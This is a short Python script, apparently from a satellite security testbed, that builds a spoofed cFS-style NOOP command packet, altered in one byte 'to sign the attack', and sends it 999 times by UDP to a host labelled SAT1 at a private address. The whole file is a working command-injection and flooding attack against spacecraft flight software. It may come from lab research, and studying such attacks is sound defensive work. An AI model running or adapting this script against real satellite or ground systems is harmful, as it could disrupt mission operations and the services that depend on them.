import socket
import numpy as np
import time

# 'CFS' NOOP
# SPP labeled on the 8th octet (from 0x00 to 0x11=10+7) to sign the attack!
command = [0x18,0x06,0xC0,0x00,0x00,0x01,0x00,0x11] 

for i in range(1,1000):
        
        #print(i)
        #print(command)

        byte_message = bytes(command)

        opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

	# 6010 is for SAT1
        opened_socket.sendto(byte_message, ("192.168.100.5", 6010))
        #time.sleep(0.1)
